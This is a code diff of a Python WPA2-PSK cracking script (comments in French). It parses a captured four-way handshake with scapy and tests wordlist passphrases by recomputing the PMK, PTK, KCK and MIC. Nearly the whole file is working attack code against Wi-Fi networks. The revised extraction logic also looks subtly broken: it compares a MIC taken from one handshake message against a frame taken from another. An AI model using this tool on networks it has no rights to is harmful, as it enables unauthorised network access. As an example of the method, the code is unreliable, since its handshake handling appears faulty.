@@ -1,37 +1,77 @@
 from scapy.all import *
-from scapy.contrib.wpa_eapol import WPA_key
 from hashlib import pbkdf2_hmac
 from passlib.utils import pbkdf2
 import hmac
+import hashlib
 import argparse
 
 class Wpa2PskAttack:
-    def main(self, input_file, wordlist):
-        # Lecture du fichier pcap contenant le handshake
+    
+    def extract_mic_and_nonce_and_ssid(self, input_file):
         packets = rdpcap(input_file)
         
-        # Récupération du SSID de l'AP dans le premier paquet
-        ssid = packets[0][Dot11].info.decode()
-        print("=========================")
-        print(f"SSID: {ssid}")
+        snonce = None
+        mic = None
+        sta_mac = None
+        bssid = None
+        anonce = None
+        ssid = None
+        eapol_packet = None
         
-        # Récupération de l'adresse MAC du client et de l'AP dans le deuxième paquet
-        client = bytes.fromhex(packets[1][Dot11].addr1.replace(":",""))
-        ap = bytes.fromhex(packets[1][Dot11].addr2.replace(":",""))
+        for packet in packets:
+            if packet.haslayer(EAPOL):
+                eapol_layer = packet.getlayer(EAPOL)
+                # Check if it's a Key (Message 2 of 4)
+                if eapol_layer.type == 3 and eapol_layer.key_mic and not mic:
+                    mic = eapol_layer.key_mic
+                    print(f"Extracted MIC: {mic.hex()}")
+                    if not snonce:
+                        snonce = eapol_layer.key_nonce
+                        print(f"Extracted SNonce: {snonce.hex()}")
+                
+                # Check if it's a Key (Message 3 of 4) to extract ANonce
+                if eapol_layer.type == 3 and eapol_layer.key_ack and not anonce:
+                    anonce = eapol_layer.key_nonce
+                    print(f"Extracted ANonce: {anonce.hex()}")
+                    eapol_packet = packet  # Save the EAPOL packet for later use
+                
+                # Extract STA MAC and BSSID
+                if not sta_mac or not bssid:
+                    sta_mac = packet.addr2
+                    bssid = packet.addr1
+                    print(f"Extracted STA MAC: {sta_mac}")
+                    print(f"Extracted BSSID: {bssid}")
+                
+                # Break the loop if all values are found
+                if mic and snonce and sta_mac and bssid and anonce:
+                    break
+            
+            # Extract SSID from Beacon packets
+            if packet.haslayer(Dot11Beacon) and not ssid:
+                ssid = packet.info.decode()
+                print(f"Extracted SSID: {ssid}")
         
-        # Récupération des nonces aNonce et sNonce dans le troisième paquet
-        anonce = packets[1][WPA_key].nonce
-        snonce = packets[2][WPA_key].nonce
+        if not snonce:
+            print("No SNonce found in Message 2 of 4.")
+        if not mic:
+            print("No MIC found.")
+        if not sta_mac:
+            print("No STA MAC found.")
+        if not bssid:
+            print("No BSSID found.")
+        if not anonce:
+            print("No ANonce found in Message 3 of 4.")
+        if not ssid:
+            print("No SSID found.")
         
-        # Affichage des nonces pour vérification
-        print("=========================")
-        print(f"aNonce: {anonce.hex()}")
-        print(f"sNonce: {snonce.hex()}")
+        return ssid, bytes.fromhex(sta_mac.replace(":", "")), bytes.fromhex(bssid.replace(":", "")), anonce, snonce, mic, eapol_packet
+    
+    def main(self, input_file, wordlist):
+        ssid, client, ap, anonce, snonce, mic, eapol_packet = self.extract_mic_and_nonce_and_ssid(input_file)
         
-        # Récupération du MIC dans le troisième paquet
-        MIC = packets[2][WPA_key].wpa_key_mic.hex()
-        print("=========================")
-        print(f"MIC: {MIC}")
+        if not (ssid and client and ap and anonce and snonce and mic and eapol_packet):
+            print("Error: Missing required information for the attack.")
+            return
         
         # Concaténation de plusieurs éléments pour former CONCATENED_NONCE, qui sera utilisé dans le calcul de la PTK
         CONCATENED_NONCE = min(ap, client) + max(ap, client) + min(anonce, snonce) + max(anonce, snonce)
@@ -55,12 +95,6 @@ class Wpa2PskAttack:
                 print(f"PSK: {PSK.hex()}")
                 print("=========================")
                 
-                # Récupération du EAPOL frame dans le troisième paquet et suppression de la valeur de MIC
-                eapol_frame = bytes(packets[2][EAPOL]).hex()
-                eapol_frame = eapol_frame[:162]+(32*"0")+eapol_frame[194:]
-                print(f"EAPOL_M2: {eapol_frame}")
-                print("=========================")
-                
                 # Calcul de la PTK à partir de PMK, PAIRWISE_KEY_EXPANSION et CONCATENED_NONCE
                 PTK = self.PRF(PMK, PAIRWISE_KEY_EXPANSION, CONCATENED_NONCE, 384)
                 print(f"PTK: {PTK.hex()}")
@@ -70,6 +104,13 @@ class Wpa2PskAttack:
                 print("=========================")
                 print(f"KCK: {KCK.hex()}")
                 
+                # Récupération du EAPOL frame dans le troisième paquet et suppression de la valeur de MIC
+                eapol_frame = bytes(eapol_packet[EAPOL]).hex()
+                print(f"Original EAPOL Frame: {eapol_frame}")  # Debug: Check original EAPOL frame
+                eapol_frame = eapol_frame[:162] + (32 * "0") + eapol_frame[194:]
+                print(f"Modified EAPOL Frame (MIC Zeroed): {eapol_frame}")  # Debug: Check modified EAPOL frame
+                print("=========================")
+                
                 # Calcul de la valeur de MIC utilisant KCK et les données extraites des paquets
                 CALCULATED_MIC = hmac.new(KCK, bytes.fromhex(eapol_frame), hashlib.sha1).hexdigest()[:32]
                 print("=========================")
@@ -77,7 +118,7 @@ class Wpa2PskAttack:
                 print("=========================")
                 
                 # Vérification si la valeur de MIC calculée correspond à celle extraite du paquet
-                if CALCULATED_MIC == MIC:
+                if CALCULATED_MIC == mic.hex():
                     print("Le handshake a été capturé avec succès et la valeur de MIC est valide.")
                     print(f"Passphrase trouvée: {passphrase}")
                     break
